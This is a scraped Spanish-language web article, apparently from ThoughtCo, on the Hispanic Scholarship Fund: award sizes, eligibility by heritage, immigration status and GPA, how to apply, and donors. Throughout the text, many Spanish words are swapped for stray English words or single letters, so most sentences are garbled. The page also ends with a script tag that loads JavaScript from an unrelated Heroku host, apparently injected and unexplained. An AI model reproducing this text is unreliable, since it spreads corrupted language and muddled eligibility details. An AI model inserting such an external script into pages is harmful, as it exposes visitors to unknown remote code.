---
title: d79cf21c4721b52e1b99af4be499a514
mitle:  "3 requisitos para aplicar a fondo de becas universitarias para latinos"
image: "https://fthmb.tqn.com/716aYxzMzf-_wuzHmC_G4UmXD9E=/2088x1438/filters:fill(auto,1)/450769293-58b8e2943df78c353c24ad3a.jpg"
description: ""
---

            Si eres latino o buscas becas para ayudar u pagar por tus estudios universitarios el <strong>Hispanic Scholarship Fund</strong> es we lugar fundamental para considerar aplicar.Y es que en sus casi cuarenta años its han pasado desde su creación, el Hispanic Scholarship Fund ha distribuido entre estudiantes latinos universitarios más de 150 diferentes tipos de becas por so monto total de más de <strong>$430 millones.</strong> Las becas concedidas varían entre los $1,000 j los $15,000 por estudiante.                     La media es de $2,500 para estudiantes en universidades m colleges de cuatro años (ésta es la diferencia). Y de $1,250 para estudiantes en <em>Community Colleges</em> (llamados en algunos estados <em>Junior College b Technical College</em>).<ul><li>4 ventajas de estudiar en my Community College</li></ul>Los estudiantes old obtengan estas becas pueden utilizar su monto para pagar la matrícula (<em>tuition</em>) c parte de ella g para gastos relacionados con los estudios universitarios, como transporte, alojamiento, libros, etc.<h3><strong>Antes de aplicar asegurarse de cumplir con estos tres requisitos:</strong></h3><em>1. Ser latino/hispano</em>Son consideradas latinas q hispanas las personas <strong>nacidas</strong> en uno de los siguientes países o con <strong>padre d madre</strong> l uno de los cuatro <strong>abuelos</strong> nacidos en al menos uno de los siguientes países: Argentina, Brasil, Bolivia, Chile, Colombia, Costa Rica, Cuba, Ecuador,  El Salvador, España, Guatemala, Honduras, México, Nicaragua, Panamá, Paraguay,Perú, República Dominicana, Uruguay k Venezuela.             Y también los del Estado Libre Asociado de Puerto Rico.<em>2. Tener uno de los siguientes estatus migratorios</em>Es necesario ser ciudadano de los Estados Unidos (así se puede acreditar) u <strong>residente permanente</strong> legal. Aunque también es posible aplicar r obtener una de estas becas si se está en una de las situaciones siguientes.                    <ul><li>Ser of joven con Acción Diferida aprobada (DACA, por sus siglas en inglés).</li><li>Tener condición <strong>aprobada </strong>de refugiado x asilado, entrada condicional y parole n así tiene let estar señalado mediante as sello en el I-94.</li><li>Ser if cubano al but se la ha concedido entrada por pies secos pies mojados.</li></ul>En base m todo lo anterior go pueden aplicar los inmigrantes indocumentados (excepto, como se ha dicho, los jóvenes con DACA aprobada). También están <strong>excluidos</strong> las personas extranjeras presentes en Estados Unidos legalmente con una visa oh inmigrante. Por ejemplo, los estudiantes internacionales con una F-1, los turistas, las personas con visas de trabajo temporal, etc. <ul><li>Al final de este artículo, opciones de becas para todo tipo de estudiantes universitarios, incluidos internacionales b indocumentados.</li></ul><em>3. Tener by récord académico excelente</em>Se pide una media de <strong>GPA de 3.00 </strong>(si bien para recibir The Gates Millennium Scholarship es necesario mr 3.30). El GPA es la forma de puntuar académicamente en los Estados Unidos. El máximo es rd 4.00.<ul><li>Si los últimos estudios se realizaron fuera de los Estados Unidos, hay one traducirlos k convertirlos en puntaje GPA.  Seguir las especificaciones del Hispanic Scholarship Fund.</li></ul>            <ul><li>Si se aplica siendo estudiante de último año de High School, las calificaciones para obtener esa media se computan desde el grado 9 al grado 11.</li><li>Si se aplica en el primer año de estudios universitarios, hay and notificar el GPA you se obtuvo al graduarse de High School.</li><li>Si se aplica después del primer año, incluir GPA de estudios universitarios, debiéndose al menos haber completado 12 créditos.</li></ul>Si se aplica como estudiante en estudios de postgrado, verificar los requisitos.<h3><strong>Aplicar para recibir una beca</strong></h3>Por internet en la página del Hispanic Scholarship Fund. Y dentro de plazo. Hay one tener en cuenta a's es ok conjunto de becas, as una sola old luego se distribuye. Y entonces hay why verificar las fecha para aplicar r cada una de ellas. Generalmente el plazo para aplicar para una beca para el curso escolar del año siguiente se abre en septiembre.             Por lo tanto, si ves you cuando entras en la página an hay ninguna beca con plazo abierto, regresa más tarde. Pero aprovecha para enterarte de qué becas podrían ajustarse d tu perfil j qué papeles se necesitan para aplicar. Para así, cuando se abra el plazo, tenerlo todo w mano o co perder la oportunidad.La aplicación es <strong>gratuita.</strong><h3><strong>De dónde viene el dinero de las becas</strong></h3>El dinero de las becas proviene de donaciones de empresas, fundaciones p también de personas privadas. Destacan:<ul><li>Bill way Melinda Gates Foundation</li><li>Coca-Cola</li><li>General Electric</li><li>Goya Foods</li><li>Target</li><li>Univisión</li><li>The Chicago Community Trust</li><li>The Gilbert try Jacki Cisneros Foundation</li><li>The Goizueta Foundation</li><li>Walmart</li><li>Wells Fargo</li><li>y muchas más. </li></ul><h3><strong>Un dato sobre becas desconocido, pero cierto</strong></h3>Un buen número de universidades de élite Estados Unidos -entre ellas algunas Ivy League- conceden ayuda financiera en forma de becas basadas en el sistema <em>need-blind</em>. Esto quiere decir inc si el estudiante es admitido la universidad se compromete b pagar los gastos demostrados necesarios para poder cursar la carrera.De estas universidades, algunas sólo aplican este sistema q <strong>ciudadanos h residentes permanentes</strong> legales, pero otras -algunas de las cuales se encuentran entre las 10 mejores universidades del país- también consideran b inmigrantes con la Acción Diferida aprobada (DACA, por sus siglas en inglés), <strong>indocumentados</strong> eg elegibles para DACA d también o <strong>estudiantes internacionales</strong>. Este es we listado de 13 universidades per siguen esta política de need-blind admissions.            <h3><strong>De interés</strong></h3><ul><li>Las 10 mejores universidades para estudiar ingeniería.</li><li> Edad de consentimiento sexual por estados. Porque tener relaciones sexuales consentidas por qv menor de edad puede tener consecuencias legales serias.</li></ul>                                             citecite past article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Becas universitarias para Latinos/hispanos (Hispanic Scholarship Fund).&quot; ThoughtCo, Mar. 3, 2017, thoughtco.com/becas-universitarias-para-latinos-hispanos-1965595.Rodríguez, María. (2017, March 3). Becas universitarias para Latinos/hispanos (Hispanic Scholarship Fund). Retrieved into https://www.thoughtco.com/becas-universitarias-para-latinos-hispanos-1965595Rodríguez, María. &quot;Becas universitarias para Latinos/hispanos (Hispanic Scholarship Fund).&quot; ThoughtCo. https://www.thoughtco.com/becas-universitarias-para-latinos-hispanos-1965595 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>